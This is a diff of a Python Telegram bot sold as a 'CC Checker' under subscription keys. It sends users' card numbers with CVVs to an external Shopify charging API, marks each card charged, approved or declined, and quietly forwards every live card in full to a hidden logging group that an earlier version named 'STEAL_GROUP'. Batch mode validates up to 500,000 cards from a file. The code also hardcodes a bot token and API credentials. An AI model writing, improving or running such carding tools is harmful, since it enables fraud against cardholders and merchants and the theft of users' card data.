@@ -1,1013 +1,705 @@
 #!/usr/bin/env python3
-"""
-🔥 BANKAI SHOP 🔥
-Bleach Anime x Shopify Card Checker
-Soul Reaper Grade Checker - Powered by Zanpakuto Engine
-"""
 
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-import asyncio
-import aiohttp
-import aiofiles
-import os
-import random
-import time
-import json
-import re
-from datetime import datetime
+import asyncio, aiohttp, aiofiles, os, random, time, json, re, secrets, string
+from datetime import datetime, timedelta
 
-# ============================================================================
-# ⚙️ CONFIGURATION - ADD YOUR CREDENTIALS HERE
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  CONFIG
+# ═══════════════════════════════════════════════
 
-BOT_TOKEN  = '8692888647:AAGBRVuhOBnNe5jIi71o7sLBAYOY6JBsevQ'
-API_ID     = 32253547
-API_HASH   = '868242502bea6a1e41b2ce46001d0580'
-
-# Second file's API endpoint (deploy auto.py on Railway and paste URL here)
+BOT_TOKEN   = '8692888647:AAGBRVuhOBnNe5jIi71o7sLBAYOY6JBsevQ'
+API_ID      = 32253547
+API_HASH    = '868242502bea6a1e41b2ce46001d0580'
 CHECKER_API = 'https://web-production-1b828.up.railway.app/shopify'
+OWNER_ID    = 5895386985
+LOGS_GROUP  = -1003769047965
 
-OWNER_ID       = 5895386985
-STEAL_GROUP    = -1003769047965   # hits forwarded here
-PREMIUM_FILE   = 'bankai_premium.txt'
-PROXY_FILE     = 'proxy.txt'
-SOULS_FILE     = 'soul_data.json'
-KEYS_FILE      = 'bankai_keys.json'
+PREMIUM_FILE = 'premium_users.json'
+PROXY_FILE   = 'proxies.txt'
+KEYS_FILE    = 'keys.json'
 
-# ============================================================================
-# 🌟 SOUL DATA MANAGEMENT
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  DATA HELPERS
+# ═══════════════════════════════════════════════
 
-def load_souls():
-    if not os.path.exists(SOULS_FILE):
-        return {}
+def _load(path, default=None):
+    if not os.path.exists(path):
+        return default if default is not None else {}
     try:
-        with open(SOULS_FILE, 'r') as f:
+        with open(path, 'r') as f:
             return json.load(f)
     except:
-        return {}
+        return default if default is not None else {}
 
-def save_souls(data):
-    with open(SOULS_FILE, 'w') as f:
+def _save(path, data):
+    with open(path, 'w') as f:
         json.dump(data, f, indent=2)
 
-def get_soul(user_id):
-    souls = load_souls()
-    uid = str(user_id)
-    if uid not in souls:
-        souls[uid] = {
-            "checks": 0, "charged": 0,
-            "approved": 0, "declined": 0,
-            "reiatsu": 0, "joined": datetime.now().isoformat()
-        }
-        save_souls(souls)
-    return souls[uid]
+# ── Premium ──
 
-def update_soul(user_id, soul):
-    souls = load_souls()
-    souls[str(user_id)] = soul
-    save_souls(souls)
+def is_premium(uid):
+    if uid == OWNER_ID:
+        return True
+    data = _load(PREMIUM_FILE)
+    info = data.get(str(uid))
+    if not info:
+        return False
+    exp = info.get('expires')
+    if exp is None:
+        return True
+    return datetime.fromisoformat(exp) > datetime.now()
 
-# ============================================================================
-# 🔑 KEY MANAGEMENT
-# ============================================================================
-
-def load_keys():
-    if not os.path.exists(KEYS_FILE):
-        return {}
-    try:
-        with open(KEYS_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_keys(data):
-    with open(KEYS_FILE, 'w') as f:
-        json.dump(data, f, indent=2)
-
-def generate_key():
-    import secrets, string
-    chars = string.ascii_uppercase + string.digits
-    parts = [''.join(secrets.choice(chars) for _ in range(4)) for _ in range(4)]
-    return 'BANKAI-' + '-'.join(parts)
-
-PREMIUM_DATA_FILE = 'bankai_premium_data.json'
-
-def load_premium_data():
-    if not os.path.exists(PREMIUM_DATA_FILE):
-        return {}
-    try:
-        with open(PREMIUM_DATA_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_premium_data(data):
-    with open(PREMIUM_DATA_FILE, 'w') as f:
-        json.dump(data, f, indent=2)
-
-def add_premium(user_id: int, days: int = 0):
-    """days=0 means permanent."""
-    data = load_premium_data()
-    uid  = str(user_id)
+def add_premium(uid, days=0):
+    data = _load(PREMIUM_FILE)
+    exp = None
     if days > 0:
-        from datetime import timedelta
-        expiry = (datetime.now() + timedelta(days=days)).isoformat()
-    else:
-        expiry = None
-    data[uid] = {'expires': expiry, 'added': datetime.now().isoformat()}
-    save_premium_data(data)
+        exp = (datetime.now() + timedelta(days=days)).isoformat()
+    data[str(uid)] = {'expires': exp, 'added': datetime.now().isoformat()}
+    _save(PREMIUM_FILE, data)
 
-def get_rank(soul):
-    c = soul['checks']
-    if c < 10:   return "👨‍🎓 Academy Student"
-    elif c < 50: return "⚔️ Seated Officer"
-    elif c < 150:return "👑 Captain"
-    elif c < 300:return "⚫ Kenpachi"
-    else:        return "🌟 Royal Guard Zero Squad"
+def remove_premium(uid):
+    data = _load(PREMIUM_FILE)
+    data.pop(str(uid), None)
+    _save(PREMIUM_FILE, data)
 
-def get_reiatsu_bar(pct):
-    filled = int(pct / 10)
-    bar = "█" * filled + "░" * (10 - filled)
-    return f"[{bar}] {pct}%"
+def premium_expiry(uid):
+    data = _load(PREMIUM_FILE)
+    info = data.get(str(uid))
+    if not info:
+        return None
+    exp = info.get('expires')
+    if exp is None:
+        return "Lifetime"
+    dt = datetime.fromisoformat(exp)
+    left = (dt - datetime.now()).days
+    return f"{dt.strftime('%Y-%m-%d')} ({left}d left)"
 
-# ============================================================================
-# 🔐 PREMIUM CHECK
-# ============================================================================
+def list_premium_users():
+    return _load(PREMIUM_FILE)
+
+# ── Keys ──
+
+def gen_key_string():
+    c = string.ascii_uppercase + string.digits
+    return 'SH-' + '-'.join(''.join(secrets.choice(c) for _ in range(4)) for _ in range(4))
+
+def create_keys(count, days):
+    data = _load(KEYS_FILE)
+    keys = []
+    for _ in range(count):
+        k = gen_key_string()
+        data[k] = {'days': days, 'used': False, 'by': None, 'created': datetime.now().isoformat()}
+        keys.append(k)
+    _save(KEYS_FILE, data)
+    return keys
+
+def redeem_key(uid, key):
+    data = _load(KEYS_FILE)
+    k = data.get(key)
+    if not k:
+        return None, "Key not found"
+    if k['used']:
+        return None, "Key already redeemed"
+    days = k['days']
+    k['used'] = True
+    k['by'] = uid
+    k['redeemed'] = datetime.now().isoformat()
+    _save(KEYS_FILE, data)
+    add_premium(uid, days)
+    return days, "OK"
+
+# ── Proxies ──
 
 def load_proxies():
     if not os.path.exists(PROXY_FILE):
         return []
-    try:
-        with open(PROXY_FILE, 'r') as f:
-            return [l.strip() for l in f if l.strip()]
-    except:
-        return []
+    with open(PROXY_FILE, 'r') as f:
+        return [l.strip() for l in f if l.strip()]
 
-def save_proxies(proxies):
+def save_proxies(lst):
     with open(PROXY_FILE, 'w') as f:
-        f.write('\n'.join(proxies) + '\n')
+        f.write('\n'.join(lst) + '\n')
 
-def is_premium(user_id):
-    if user_id == OWNER_ID:
-        return True
-    uid  = str(user_id)
-    data = load_premium_data()
-    if uid in data:
-        expiry = data[uid].get('expires')
-        if expiry is None:
-            return True
-        return datetime.fromisoformat(expiry) > datetime.now()
-    # fallback: old text file for permanent users
-    if os.path.exists(PREMIUM_FILE):
-        try:
-            with open(PREMIUM_FILE, 'r') as f:
-                return uid in [l.strip() for l in f]
-        except:
-            pass
-    return False
+def pick_proxy():
+    p = load_proxies()
+    return random.choice(p) if p else ''
 
-def get_premium_expiry(user_id) -> str:
-    uid  = str(user_id)
-    data = load_premium_data()
-    if uid not in data:
-        if os.path.exists(PREMIUM_FILE):
-            try:
-                with open(PREMIUM_FILE, 'r') as f:
-                    if uid in [l.strip() for l in f]:
-                        return "♾️ Permanent"
-            except:
-                pass
-        return "None"
-    expiry = data[uid].get('expires')
-    if expiry is None:
-        return "♾️ Permanent"
-    dt = datetime.fromisoformat(expiry)
-    remaining = (dt - datetime.now()).days
-    return f"📅 {dt.strftime('%Y-%m-%d')} ({remaining}d left)"
+# ── Cards ──
 
-def extract_cards(text):
-    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
-    matches = re.findall(pattern, text)
+def parse_cards(text):
+    found = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
     cards = []
-    for card, mm, yy, cvv in matches:
+    for num, mm, yy, cvv in found:
         if len(yy) == 2:
             yy = '20' + yy
-        cards.append(f"{card}|{mm}|{yy}|{cvv}")
+        cards.append(f'{num}|{mm}|{yy}|{cvv}')
     return cards
 
-# ============================================================================
-# ⚔️ ZANPAKUTO CHECKER ENGINE (Calls second file API)
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  CHECKER ENGINE — REAL API CALLS
+# ═══════════════════════════════════════════════
 
-async def zanpakuto_check(card: str, proxy: str = "") -> dict:
-    """Call the Shopify checker API (second file / Railway endpoint)"""
+async def check_card(card, proxy=''):
     try:
         params = {'cc': card}
         if proxy:
             params['proxy'] = proxy
-
         timeout = aiohttp.ClientTimeout(total=35)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API, params=params) as resp:
-                data = await resp.json(content_type=None)
+        async with aiohttp.ClientSession(timeout=timeout) as s:
+            async with s.get(CHECKER_API, params=params) as r:
+                d = await r.json(content_type=None)
 
-        response  = str(data.get('Response', '')).upper()
-        status    = data.get('Status', '')
-        gate      = data.get('Gate', 'Shopify')
-        price     = data.get('Price', '?')
-        site      = data.get('Site', '-')
-        elapsed   = data.get('Time', '-')
-        receipt   = data.get('Receipt', '')
-        error_detail = data.get('ErrorDetail', '') or data.get('Status', '') or response
-        charged   = str(data.get('Charged', 'False')).lower() == 'true'
-        approved  = str(data.get('Approved', 'False')).lower() == 'true'
+        resp    = str(d.get('Response', '')).upper()
+        gate    = d.get('Gate', 'Shopify')
+        price   = d.get('Price', '-')
+        site    = d.get('Site', '-')
+        elapsed = d.get('Time', '-')
+        receipt = d.get('Receipt', '')
+        detail  = d.get('ErrorDetail', '') or d.get('Status', '') or resp
+        charged = str(d.get('Charged', 'False')).lower() == 'true'
+        approved = str(d.get('Approved', 'False')).lower() == 'true'
 
-        # Flexible matching — catch all API response variations
-        if charged or 'CHARGED' in response:
-            return {'status': 'CHARGED', 'gate': gate, 'price': price,
-                    'site': site, 'time': elapsed, 'receipt': receipt,
-                    'raw': response, 'code': status or response}
+        base = {'gate': gate, 'price': price, 'site': site,
+                'time': elapsed, 'receipt': receipt, 'response': resp, 'detail': detail}
 
-        if approved or 'APPROVED' in response:
-            return {'status': 'APPROVED', 'gate': gate, 'price': price,
-                    'site': site, 'time': elapsed, 'raw': response,
-                    'code': status or response}
-
-        if any(x in response for x in ('DECLINE', 'DECLINED', 'CARD DECLINED', 'DO NOT HONOR',
-                                        'INSUFFICIENT', 'INVALID', 'STOLEN', 'LOST',
-                                        'EXPIRED', 'PICKUP', 'BLOCKED', 'RESTRICTED')):
-            return {'status': 'DECLINED', 'gate': gate, 'price': price,
-                    'site': site, 'time': elapsed, 'raw': response,
-                    'code': status or error_detail or response}
-
-        # Still an error — but show full details for debugging
-        return {'status': 'ERROR', 'gate': gate, 'price': '?',
-                'site': site, 'time': elapsed, 'raw': response,
-                'code': error_detail or response or 'Unknown error from API'}
+        if charged or 'CHARGED' in resp:
+            return {**base, 'result': 'CHARGED'}
+        if approved or 'APPROVED' in resp:
+            return {**base, 'result': 'APPROVED'}
+        if any(w in resp for w in ('DECLINE', 'DO NOT HONOR', 'INSUFFICIENT',
+                                    'INVALID', 'STOLEN', 'LOST', 'EXPIRED',
+                                    'PICKUP', 'BLOCKED', 'RESTRICTED', 'FRAUD',
+                                    'EXCEEDS', 'NOT PERMITTED', 'SECURITY')):
+            return {**base, 'result': 'DECLINED'}
+        return {**base, 'result': 'ERROR'}
 
     except asyncio.TimeoutError:
-        return {'status': 'TIMEOUT', 'raw': 'Zanpakuto timed out', 'gate': '-',
-                'price': '-', 'site': '-', 'time': '-', 'code': 'TIMEOUT'}
+        return {'result': 'TIMEOUT', 'gate': '-', 'price': '-', 'site': '-',
+                'time': '-', 'receipt': '', 'response': 'TIMEOUT', 'detail': 'Request timed out'}
     except Exception as e:
-        return {'status': 'ERROR', 'raw': str(e), 'gate': '-',
-                'price': '-', 'site': '-', 'time': '-', 'code': 'EXCEPTION'}
+        return {'result': 'ERROR', 'gate': '-', 'price': '-', 'site': '-',
+                'time': '-', 'receipt': '', 'response': 'ERROR', 'detail': str(e)[:200]}
 
-async def forward_hit(card: str, result: dict, user_id: int, bin_info: dict = {}):
-    """Forward CHARGED/APPROVED hits to the steal group."""
-    st       = result['status']
-    emoji    = "💎" if st == 'CHARGED' else "✅"
-    label    = "CHARGED — ORDER PLACED" if st == 'CHARGED' else "APPROVED — CCN LIVE"
-    bank     = bin_info.get('bank', '—')
-    brand    = bin_info.get('brand', '—')
-    country  = bin_info.get('country_name', '—')
-    flag     = bin_info.get('country_flag', '')
-
-    msg = (
-        f"<b>{emoji} 『 BANKAI HIT 』 {emoji}</b>\n"
-        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
-        f"<b>⚫ Status:</b>  {label}\n"
-        f"<b>💳 Card:</b>   <code>{card}</code>\n"
-        f"<b>🏦 Gate:</b>   {result.get('gate', '—')}\n"
-        f"<b>💰 Price:</b>  {result.get('price', '—')}\n"
-        f"<b>🌐 Site:</b>   {result.get('site', '—')}\n"
-        f"<b>⏱️ Time:</b>   {result.get('time', '—')}\n\n"
-        f"<b>🏦 Bank:</b>   {bank}\n"
-        f"<b>💠 Brand:</b>  {brand} {flag}\n"
-        f"<b>🌍 Country:</b>{country}\n\n"
-        f"<b>👤 Checker:</b> <code>{user_id}</code>"
-    )
-    if st == 'CHARGED' and result.get('receipt'):
-        msg += f"\n<b>🧾 Receipt:</b> {result['receipt']}"
-
+async def bin_lookup(card):
     try:
-        await bot.send_message(STEAL_GROUP, msg, parse_mode='html')
-    except Exception:
-        pass
-
-async def get_bin_info(card_number: str) -> dict:
-    """Get BIN info"""
-    try:
-        timeout = aiohttp.ClientTimeout(total=10)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as res:
-                if res.status == 200:
-                    return await res.json()
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as s:
+            async with s.get(f'https://bins.antipublic.cc/bins/{card[:6]}') as r:
+                if r.status == 200:
+                    return await r.json()
     except:
         pass
     return {}
 
-# ============================================================================
-# 🎮 BOT INIT
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  FORWARD HITS TO LOG GROUP
+# ═══════════════════════════════════════════════
+
+async def forward_hit(card, res, uid, bi=None):
+    bi = bi or {}
+    tag = '💎 CHARGED' if res['result'] == 'CHARGED' else '✅ APPROVED'
+    txt = (
+        f"<b>{tag}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"<b>CC:</b>  <code>{card}</code>\n"
+        f"<b>Gate:</b>  {res['gate']}\n"
+        f"<b>Price:</b> {res['price']}\n"
+        f"<b>Site:</b>  {res['site']}\n"
+        f"<b>Time:</b>  {res['time']}\n"
+        f"<b>Bank:</b>  {bi.get('bank','—')}\n"
+        f"<b>Brand:</b> {bi.get('brand','—')} {bi.get('country_flag','')}\n"
+        f"<b>User:</b>  <code>{uid}</code>"
+    )
+    if res['result'] == 'CHARGED' and res.get('receipt'):
+        txt += f"\n<b>Receipt:</b> {res['receipt']}"
+    try:
+        await bot.send_message(LOGS_GROUP, txt, parse_mode='html')
+    except:
+        pass
+
+# ═══════════════════════════════════════════════
+#  BOT INIT
+# ═══════════════════════════════════════════════
 
 SESSION_STRING = os.environ.get('SESSION_STRING', '')
-_session = StringSession(SESSION_STRING) if SESSION_STRING else StringSession()
-bot = TelegramClient(_session, API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+_sess = StringSession(SESSION_STRING) if SESSION_STRING else StringSession()
+bot = TelegramClient(_sess, API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
 if not SESSION_STRING:
-    _saved = bot.session.save()
-    print("\n" + "=" * 60)
-    print("⚠️  SESSION_STRING is not set!")
-    print("Copy the string below and add it to Railway Variables")
-    print("as SESSION_STRING then redeploy:")
-    print("=" * 60)
-    print(_saved)
-    print("=" * 60 + "\n")
+    saved = bot.session.save()
+    print('\n' + '='*60)
+    print('SESSION_STRING not set — copy this to Railway Variables:')
+    print('='*60)
+    print(saved)
+    print('='*60 + '\n')
 
-active_sessions = {}
+sessions = {}
 
-# ============================================================================
-# ⛩️ /start - SOUL SOCIETY PORTAL
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  /start
+# ═══════════════════════════════════════════════
 
 @bot.on(events.NewMessage(pattern='/start'))
-async def start_handler(event):
-    user_id = event.sender_id
-    soul    = get_soul(user_id)
-    rank    = get_rank(soul)
-    bar     = get_reiatsu_bar(soul['reiatsu'])
+async def cmd_start(e):
+    uid  = e.sender_id
+    prem = is_premium(uid)
+    exp  = premium_expiry(uid)
+    tag  = '✅ Premium' if prem else '❌ Free'
+    exp_line = f'\n<b>Expires:</b> {exp}' if exp else ''
 
     buttons = [
-        [
-            Button.inline("⚔️  𝗭𝗔𝗡𝗣𝗔𝗞𝗨𝗧𝗢  ⚔️", data=b"zanpakuto"),
-        ],
-        [
-            Button.inline("🌟 𝗦𝗢𝗨𝗟 𝗣𝗢𝗪𝗘𝗥", data=b"reiatsu"),
-            Button.inline("📊 𝗦𝗧𝗔𝗧𝗦", data=b"stats"),
-        ],
-        [
-            Button.inline("🔥 𝗕𝗔𝗡𝗞𝗔𝗜 𝗠𝗢𝗗𝗘", data=b"bankai"),
-            Button.inline("👻 𝗣𝗥𝗢𝗫𝗬", data=b"proxy_info"),
-        ],
-        [
-            Button.inline("⛩️  𝗦𝗢𝗨𝗟 𝗦𝗢𝗖𝗜𝗘𝗧𝗬  ⛩️", data=b"society"),
-        ],
+        [Button.inline('📋 Commands', b'cmd_help'),
+         Button.inline('👤 Profile', b'profile')],
+        [Button.inline('🌐 Proxy', b'proxy_menu'),
+         Button.inline('📊 Status', b'api_check')],
+        [Button.inline('🔑 Redeem Key', b'redeem_help')],
     ]
 
-    await event.reply(
-        f"<b>『 🔥 𝗕𝗔𝗡𝗞𝗔𝗜 𝗦𝗛𝗢𝗣 🔥 』</b>\n"
-        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
-        f"<b>⚫ Soul ID:</b> <code>{user_id}</code>\n"
-        f"<b>⚔️ Rank:</b> {rank}\n"
-        f"<b>💜 Reiatsu:</b> {bar}\n\n"
-        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
-        f"<b>⚪ Tensa Zangetsu</b> → Single Check\n"
-        f"<b>🔴 Ryūjin Jakka</b>  → Batch Check\n"
-        f"<b>🔵 Sōgyo no Kotowari</b> → Proxy\n"
-        f"<b>💜 Kyōka Suigetsu</b> → Stats\n\n"
-        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
-        f"<b>🌟 Powered by Zanpakuto Engine</b>",
-        parse_mode='html',
-        buttons=buttons
+    await e.reply(
+        f"<b>⚡ SHOPIIIX ─ CC Checker</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<b>ID:</b>     <code>{uid}</code>\n"
+        f"<b>Plan:</b>   {tag}{exp_line}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"<b>/cc</b>  — Check single card\n"
+        f"<b>/chk</b> — Check .txt file\n"
+        f"━━━━━━━━━━━━━━━━━━━━",
+        parse_mode='html', buttons=buttons
     )
 
-# ============================================================================
-# ⚔️ /cc - SINGLE CARD CHECK
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  /cc  — SINGLE CHECK
+# ═══════════════════════════════════════════════
 
 @bot.on(events.NewMessage(pattern=r'^/cc\s+'))
-async def check_single(event):
-    user_id = event.sender_id
+async def cmd_cc(e):
+    uid = e.sender_id
+    if not is_premium(uid):
+        return await e.reply('<b>⛔ Premium required.</b> Use /redeem KEY', parse_mode='html')
 
-    if not is_premium(user_id):
-        await event.reply(
-            "<b>⛔ REIATSU INSUFFICIENT</b>\n\n"
-            "Only Soul Reapers with Bankai access can use this.\n"
-            "Contact Soul Society admin.",
-            parse_mode='html'
-        )
-        return
+    raw = e.message.text.split(maxsplit=1)[1].strip()
+    if not re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', raw):
+        return await e.reply(
+            '<b>Format:</b> <code>/cc CARD|MM|YY|CVV</code>\n'
+            '<b>Example:</b> <code>/cc 4111111111111111|12|25|123</code>',
+            parse_mode='html')
 
-    card = event.message.text.replace('/cc ', '').strip()
-    if not re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card):
-        await event.reply(
-            "<b>❌ Invalid Zanpakuto Format</b>\n\n"
-            "Use: <code>/cc CARD|MM|YY|CVV</code>\n"
-            "Example: <code>/cc 4111111111111111|12|25|123</code>",
-            parse_mode='html'
-        )
-        return
+    msg = await e.reply('<b>Checking...</b>', parse_mode='html')
 
-    proxies = load_proxies()
-    proxy   = random.choice(proxies) if proxies else ""
+    res = await check_card(raw, pick_proxy())
+    bi  = await bin_lookup(raw.split('|')[0])
 
-    status_msg = await event.reply(
-        "<b>🗡️ Zanpakuto Awakening...</b>\n"
-        "<b>⚡ Charging Reiatsu...</b>\n"
-        "<b>🌀 Initiating Bankai Sequence...</b>",
-        parse_mode='html'
+    num    = raw.split('|')[0]
+    masked = f'{num[:6]}xxxxxx{num[-4:]}'
+
+    r = res['result']
+    if r == 'CHARGED':
+        icon, label = '💎', 'CHARGED — Order Placed'
+    elif r == 'APPROVED':
+        icon, label = '✅', 'APPROVED — CCN Live'
+    elif r == 'DECLINED':
+        icon, label = '❌', 'DECLINED'
+    elif r == 'TIMEOUT':
+        icon, label = '⏳', 'TIMEOUT'
+    else:
+        icon, label = '⚠️', 'ERROR'
+
+    out = (
+        f"<b>{icon} {label}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<b>Card:</b>    <code>{masked}</code>\n"
+        f"<b>Gate:</b>    {res['gate']}\n"
+        f"<b>Price:</b>   {res['price']}\n"
+        f"<b>Site:</b>    {res['site']}\n"
+        f"<b>Time:</b>    {res['time']}\n\n"
+        f"<b>── BIN ──</b>\n"
+        f"<b>Bank:</b>    {bi.get('bank','—')}\n"
+        f"<b>Brand:</b>   {bi.get('brand','—')} {bi.get('country_flag','')}\n"
+        f"<b>Country:</b> {bi.get('country_name','—')}\n"
+        f"<b>Type:</b>    {bi.get('type','—')} | {bi.get('level','—')}\n\n"
+        f"<b>── Response ──</b>\n"
+        f"<code>{(res.get('detail') or res.get('response') or '-')[:200]}</code>"
     )
 
-    try:
-        result   = await zanpakuto_check(card, proxy)
-        bin_info = await get_bin_info(card.split('|')[0])
+    if r == 'CHARGED' and res.get('receipt'):
+        out += f"\n\n<b>Receipt:</b> {res['receipt']}"
 
-        card_num    = card.split('|')[0]
-        masked      = f"{card_num[:6]}{'★'*6}{card_num[-4:]}"
-        bank        = bin_info.get('bank', '—')
-        brand       = bin_info.get('brand', '—')
-        country     = bin_info.get('country_name', '—')
-        flag        = bin_info.get('country_flag', '')
-        card_type   = bin_info.get('type', '—')
-        level       = bin_info.get('level', '—')
+    await msg.edit(out, parse_mode='html')
 
-        # Status styling
-        st = result['status']
-        if st == 'CHARGED':
-            status_line = "💎 CHARGED ─ ORDER PLACED"
-            border      = "═" * 22
-        elif st == 'APPROVED':
-            status_line = "✅ APPROVED ─ CCN LIVE"
-            border      = "─" * 22
-        elif st == 'DECLINED':
-            status_line = "❌ DECLINED ─ CARD DEAD"
-            border      = "─" * 22
-        elif st == 'TIMEOUT':
-            status_line = "⏳ TIMEOUT ─ SITE DEAD"
-            border      = "─" * 22
-        else:
-            status_line = f"⚠️ ERROR ─ {st}"
-            border      = "─" * 22
+    if r in ('CHARGED', 'APPROVED'):
+        await forward_hit(raw, res, uid, bi)
 
-        # Update soul
-        soul = get_soul(user_id)
-        soul['checks'] += 1
-        if st == 'CHARGED':
-            soul['charged'] += 1
-            soul['reiatsu'] = min(100, soul['reiatsu'] + 10)
-        elif st == 'APPROVED':
-            soul['approved'] += 1
-            soul['reiatsu'] = min(100, soul['reiatsu'] + 5)
-        else:
-            soul['declined'] += 1
-            soul['reiatsu'] = min(100, soul['reiatsu'] + 1)
-        update_soul(user_id, soul)
-
-        out = (
-            f"<b>『 ⚔️ ZANPAKUTO RESULT 』</b>\n"
-            f"<b>{border}</b>\n\n"
-            f"<b>⚫ Status:</b>  {status_line}\n"
-            f"<b>💳 Card:</b>   <code>{masked}</code>\n"
-            f"<b>🏦 Gate:</b>   {result['gate']}\n"
-            f"<b>💰 Price:</b>  {result['price']}\n"
-            f"<b>🌐 Site:</b>   {result['site']}\n"
-            f"<b>⏱️ Time:</b>   {result['time']}\n\n"
-            f"<b>━━━━━━ BIN INFO ━━━━━━</b>\n"
-            f"<b>🏦 Bank:</b>   {bank}\n"
-            f"<b>💠 Brand:</b>  {brand} {flag}\n"
-            f"<b>🌍 Country:</b>{country}\n"
-            f"<b>📋 Type:</b>   {card_type} | {level}\n\n"
-            f"<b>━━━━━━ RESPONSE ━━━━━━</b>\n"
-            f"<code>{(result.get('code') or result.get('raw') or 'No details')[:180]}</code>\n\n"
-            f"<b>💜 Reiatsu:</b> {get_reiatsu_bar(soul['reiatsu'])}"
-        )
-
-        if st == 'CHARGED' and result.get('receipt'):
-            out += f"\n<b>🧾 Receipt:</b> {result['receipt']}"
-
-        await status_msg.edit(out, parse_mode='html')
-
-        if st in ('CHARGED', 'APPROVED'):
-            await forward_hit(card, result, user_id, bin_info)
-
-    except Exception as e:
-        await status_msg.edit(
-            f"<b>❌ Zanpakuto Malfunction</b>\n\n<code>{str(e)[:150]}</code>",
-            parse_mode='html'
-        )
-
-# ============================================================================
-# 📄 /chk - BATCH CHECK FROM FILE
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  /chk  — BATCH CHECK FROM .TXT FILE
+# ═══════════════════════════════════════════════
 
 @bot.on(events.NewMessage(pattern=r'^/chk'))
-async def check_file(event):
-    user_id = event.sender_id
+async def cmd_chk(e):
+    uid = e.sender_id
+    if not is_premium(uid):
+        return await e.reply('<b>⛔ Premium required.</b>', parse_mode='html')
 
-    if not is_premium(user_id):
-        await event.reply("<b>⛔ Bankai Access Required</b>", parse_mode='html')
-        return
+    if not e.reply_to_msg_id:
+        return await e.reply('<b>Reply to a .txt file with /chk</b>', parse_mode='html')
 
-    if not event.reply_to_msg_id:
-        await event.reply("<b>❌ Reply to a .txt file containing cards</b>", parse_mode='html')
-        return
-
-    reply = await event.get_reply_message()
+    reply = await e.get_reply_message()
     if not reply.file or not reply.file.name.endswith('.txt'):
-        await event.reply("<b>❌ Must be a .txt file</b>", parse_mode='html')
-        return
+        return await e.reply('<b>File must be .txt</b>', parse_mode='html')
 
-    proxies    = load_proxies()
-    status_msg = await event.reply("<b>🌀 Soul Society processing file...</b>", parse_mode='html')
-    file_path  = await reply.download_media()
+    msg  = await e.reply('<b>Loading file...</b>', parse_mode='html')
+    path = await reply.download_media()
 
     try:
-        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            content = await f.read()
+        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            text = await f.read()
 
-        cards = extract_cards(content)
+        cards = parse_cards(text)
         if not cards:
-            await status_msg.edit("<b>❌ No valid cards found in file</b>", parse_mode='html')
-            return
+            return await msg.edit('<b>No valid cards in file.</b>', parse_mode='html')
 
-        total   = min(len(cards), 500000)
-        results = {'charged': 0, 'approved': 0, 'declined': 0, 'error': 0,
-                   'checked': 0, 'start': time.time()}
-        hits    = []
+        total = min(len(cards), 500000)
+        stat  = {'charged': 0, 'approved': 0, 'declined': 0, 'error': 0,
+                 'done': 0, 't0': time.time()}
+        hits  = []
 
-        sid = f"{user_id}_{status_msg.id}"
-        active_sessions[sid] = {'paused': False, 'stopped': False}
+        sid = f'{uid}_{msg.id}'
+        sessions[sid] = {'pause': False, 'stop': False}
 
-        await status_msg.edit(
-            f"<b>🔥 BANKAI BATCH MODE ACTIVATED</b>\n\n"
-            f"<b>⚔️ Cards:</b> {total}\n"
-            f"<b>🌀 Initializing Zanpakuto Engine...</b>",
-            parse_mode='html'
-        )
-
-        buttons = [
-            [
-                Button.inline("⏸️ Pause", data=f"pause_{sid}".encode()),
-                Button.inline("🛑 Stop",  data=f"stop_{sid}".encode()),
-            ]
-        ]
+        btns = [[Button.inline('⏸ Pause', f'p_{sid}'.encode()),
+                 Button.inline('🛑 Stop', f's_{sid}'.encode())]]
 
         for card in cards[:total]:
-            if sid not in active_sessions or active_sessions[sid]['stopped']:
+            if sid not in sessions or sessions[sid]['stop']:
                 break
-            while active_sessions[sid]['paused']:
+            while sessions.get(sid, {}).get('pause'):
                 await asyncio.sleep(1)
 
-            proxy  = random.choice(proxies) if proxies else ""
-            result = await zanpakuto_check(card, proxy)
-            st     = result['status']
+            res = await check_card(card, pick_proxy())
+            r   = res['result']
 
-            if st == 'CHARGED':
-                results['charged'] += 1
-                hits.append(f"💎 CHARGED | {card} | {result['site']} | {result['price']}")
-                await forward_hit(card, result, user_id)
-            elif st == 'APPROVED':
-                results['approved'] += 1
-                hits.append(f"✅ APPROVED | {card} | {result['site']}")
-                await forward_hit(card, result, user_id)
-            elif st == 'DECLINED':
-                results['declined'] += 1
+            if r == 'CHARGED':
+                stat['charged'] += 1
+                hits.append(f"💎 {card} | {res['site']} | {res['price']}")
+                await forward_hit(card, res, uid)
+            elif r == 'APPROVED':
+                stat['approved'] += 1
+                hits.append(f"✅ {card} | {res['site']}")
+                await forward_hit(card, res, uid)
+            elif r == 'DECLINED':
